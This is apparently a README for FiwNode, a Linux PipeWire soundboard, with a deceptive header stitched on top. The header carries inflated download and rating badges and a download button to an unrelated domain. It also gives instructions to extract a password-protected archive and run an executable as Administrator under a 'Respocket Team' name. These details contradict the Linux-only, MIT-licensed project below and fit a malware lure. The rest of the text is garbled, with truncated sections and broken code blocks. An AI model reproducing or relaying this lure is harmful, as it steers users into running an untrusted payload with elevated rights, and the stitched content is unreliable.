<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

## Features

- Native PipeWire capture, playback, and virtual microphone nodes.
- Independent Mic, Chat-effects, and local Monitor gain and mute controls.
- On-demand FFmpeg decoding for WAV, MP3, FLAC, Vorbis, Opus, AAC/M4A, MP4,
  and other local files supported by the installed FFmpeg build.
- Qt 6 desktop application with search, folders, collections, favorites,
  colors, queues, device selection, tray controls, and configurable shortcuts.
- First-class CLI for playback, queue, library, routing, and daemon control.
- SQLite/FTS5 library that indexes existing directories without copying or
  modifying source audio.
- XDG-compliant configuration, state, cache, data, and runtime locations.
- Local-only IPC over a mode-0600 Unix socket; no network service or telemetry.

## How the audio flows

```text
physical mic ──> Mic gain/mute ────────────┐
                                           ├──> FiwNode Chat ──> voice app
local file ──> FFmpeg ──> Chat gain/mute ───┘
                       └──> Monitor gain/mute ──> your speakers/headphones
```

The Chat bus controls what other people hear. Monitor controls what you hear;
it does not loop your microphone into your headphones. The daemon owns the
PipeWire graph, playback, library, and configuration. The GUI and CLI talk to
it over a local Unix socket.

## Requirements

Runtime:

- Linux with PipeWire and a session manager such as WirePlumber
- FFmpeg and ffprobe
- SQLite with FTS5
- Qt 6 Core, Gui, Qml, Quick, QuickControls2, Widgets, and DBus libraries

Building additionally requires:

- Rust 1.85 or newer
- a C and C++17 toolchain
- `pkg-config`, PipeWire development headers, libclang, and SQLite headers
- Qt 6 development files and tools including `qmake6`, `qmltyperegistrar`,
  `rcc`, and `qmlcachegen`

Package names differ between distributions. On Gentoo these capabilities are
provided by the normal Rust/C++ toolchain plus PipeWire, FFmpeg, SQLite,
libclang, and Qt 6 Base/Declarative development installations. Binary release
archives still use the host's PipeWire, Qt, SQLite, and FFmpeg libraries.

# Gentoo
sudo emerge --ask --noreplace dev-lang/rust-bin llvm-core/clang dev-util/pkgconf \
  media-video/pipewire media-video/wireplumber media-video/ffmpeg dev-db/sqlite \
  dev-qt/qtbase dev-qt/qtdeclarative dev-qt/qttools dev-qt/qtsvg

# Arch Linux
sudo pacman -S --needed base-devel rust clang pkgconf pipewire wireplumber \
  ffmpeg sqlite qt6-base qt6-declarative qt6-tools qt6-svg
```

On Ubuntu 24.04 and derivatives, the packaged `rustc` is too old for this
workspace. Install `rustup` and run `rustup default stable`; the helper above
### Release archive

Download and extract the `linux-x86_64` archive from
### Build from source

```bash
## Basic use

The GUI starts and manages `fiwnode-daemon` by default. Select **FiwNode Chat**
as the microphone in Discord, OBS, a game, or another voice application.
The title bar's tray button hides the window when a system tray is available.
The close button hides it only when **Settings → Tray → Close to tray** is on;
**Quit FiwNode** in the tray menu or `Ctrl+Q` exits the app.

Useful CLI commands:

```bash
fiwnode start                         # start the daemon in the background
fiwnode devices                       # list stable PipeWire device names
fiwnode add ~/Sounds                  # index a directory without copying it
fiwnode search "metal pipe"
fiwnode play "metal pipe"             # library match
fiwnode play ./sound.mp3              # direct local file
fiwnode pause                         # resume and toggle are also available
fiwnode stop
fiwnode volume mic -3
fiwnode volume chat -3
fiwnode volume monitor -18
fiwnode mute chat                     # microphone remains audible
fiwnode queue add ./next-sound.ogg
fiwnode status
fiwnode shutdown
```

Run `fiwnode --help` or `fiwnode <command> --help` for the complete interface.

## If something is not working

- **FiwNode Chat is missing:** run `fiwnode status` and make sure the daemon
  and PipeWire session are running. Start the daemon with `fiwnode start`, then
  reopen the microphone selector in your voice app.
- **Others hear nothing:** select **FiwNode Chat** as the input in the voice
  app. In FiwNode, check the microphone device and the Mic and Chat mute/level
  controls. Monitor level changes only what you hear locally.
- **No sound in your headphones:** check the Monitor mute/level control and
  output device. It is separate from the Chat mix.
- **The close button exits:** turn on **Settings → Tray → Close to tray**. The
  tray icon may be in your desktop's hidden-icons menu. The title bar's tray
  button hides the window directly when a tray is available.
- **A hotkey does not trigger:** use the desktop's GlobalShortcuts portal where
  available. Evdev capture requires read access to the chosen input device;
  the installer does not grant broad input permissions.

## Data and privacy

FiwNode does not upload audio, library metadata, or usage information.

| Purpose | Default location | Override |
| --- | --- | --- |
| IPC socket | `$XDG_RUNTIME_DIR/fiwnode/fiwnode.sock` | `FIWNODE_SOCKET` |
| Configuration | `$XDG_CONFIG_HOME/fiwnode/config.toml` | `FIWNODE_CONFIG` |
| Library | `$XDG_DATA_HOME/fiwnode/library.db` | `FIWNODE_LIBRARY` |
| Daemon log | `$XDG_STATE_HOME/fiwnode/daemon.log` | XDG state directory |

Removing a library root or collection removes only FiwNode metadata. Source
audio files are never deleted by those operations.

On supported desktops, the GUI uses the XDG GlobalShortcuts portal. The daemon
can also use readable evdev devices for Soundpad-style physical-key shortcuts,
but the project does not install broad input-device permission rules. Configure
device access through your distribution's normal security policy if you choose
to enable that path.

## Configuration and behavior

- Device selections use stable PipeWire names, not numeric session IDs.
- Missing preferred devices temporarily fall back to session defaults and move
  back when the preferred device returns.
- One sound plays at a time; a new play replaces the current sound. The bounded
  queue can continue with additional sounds.
- Effects monitoring is separate from the microphone path, preventing sidetone
  by default.
- Gains range from -60 dB to +30 dB. Strong positive gain can clip a mix.
- FFmpeg receives structured process arguments and local file descriptors;
  filenames are never interpolated through a shell.

## Known limitations

- Linux, PipeWire, and Qt 6 are required; Windows and macOS are unsupported.
- PipeWire server restart recovery needs broader hardware testing.
- Filesystem watching, per-sound bus gain, waveform previews, meters, OBS
  automation, and Stream Deck integration are not yet complete.
- Directory import currently discovers known media extensions. Direct playback
  probes content regardless of extension.
- Binary archives are dynamically linked and may not suit older distributions;
  building from source is the supported fallback.

## Uninstall

Run `./scripts/uninstall-user.sh` from a source checkout or an unpacked release
archive. It removes the installed binaries, desktop launcher, and icons. Your
configuration and sound library stay in the XDG directories listed above.


---

# Security policy

The latest published FiwNode release receives security fixes. Earlier
versions may need to upgrade to receive a fix.

## Report privately

Do not post exploit details in a public issue. Use


---

# Contributing to FiwNode

Issues, hardware reports, documentation fixes, and pull requests are welcome.
Please open an issue before starting a large change so its behavior and scope
can be discussed first.

## Get started

1. Fork and clone the repository.
## Check your change

```bash
cargo fmt --all -- --check
cargo clippy --workspace --all-targets --all-features --locked -- -D warnings
cargo test --workspace --locked
bash apps/gui/tests/run-qml-tests.sh
```

For audio routing, tray, shortcuts, or device changes, also describe a manual
test in a real PipeWire session. Include the desktop, distribution, relevant
device names, and whether you tested Wayland or X11. Use isolated XDG
directories for automated tests; do not modify a developer's real sound
library, configuration, or audio files.

## Pull requests

- Keep one fix or feature per PR and explain the behavior users will see.
- Update `README.md` and `CHANGELOG.md` when behavior or installation changes.
- Note CPU, memory, or latency impact for audio-path changes. Keep queue and
  cache growth bounded.
- Do not add machine-specific paths, user screenshots with private data,
  credentials, or broad input-device permission rules.
- Use small commits with a human author. Do not add AI co-author trailers;
  you are responsible for understanding the code you submit.


---

MIT License

Copyright (c) 2026 Fi3w0

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
